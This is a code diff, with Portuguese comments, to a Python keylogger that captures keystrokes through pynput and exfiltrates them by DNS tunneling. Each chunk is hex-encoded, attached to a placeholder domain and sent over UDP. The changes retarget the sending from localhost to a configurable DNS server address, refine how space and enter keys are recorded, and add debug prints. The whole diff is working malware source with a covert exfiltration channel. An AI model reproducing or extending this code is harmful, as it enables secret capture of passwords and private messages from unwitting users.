@@ -49,6 +49,7 @@ def send_data(data):
     while len(parts) > 0:
         # Cria o payload com o nome de domínio fictício
         payload = parts.pop(0)
+        print(f'enviando isso: {payload}')
         payload = ''.join([hex(ord(c)) for c in payload])
         payload = payload.replace('0x', '')
         request = str(payload) + str(_FAKE_DOMAIN)
@@ -61,7 +62,7 @@ def send_data(data):
         sock.settimeout(5.0)
 
         try:
-            sock.sendto(domain.pack(), ('127.0.0.1', 9953))
+            sock.sendto(domain.pack(), _DNS_ADDR)
         except:
             print('Erro ao enviar!')
 
@@ -148,17 +149,23 @@ def on_release(key):
         # Possíveis valores em
         # https://pynput.readthedocs.io/en/latest/_modules/pynput/keyboard/_base.html#Key
         
-        if key == key.space:
-            _KEYS.append(' ')
+        if key == key.space or key == key.enter:
+            try:
+                if _KEYS[-1] == ' ':
+                    pass
+                else:
+                    _KEYS.append(' ')
+            except:
+                pass
 
         elif key == key.backspace:
             _KEYS = _KEYS[:-1]
 
-        elif key == key.enter:
-            _KEYS += ' \n'
+        #elif key == key.enter:
+            #_KEYS += '/\n'
 
-        '''else:
-            print(key)'''
+        else:
+            print(key)
 
 ###############################################################
 # Main
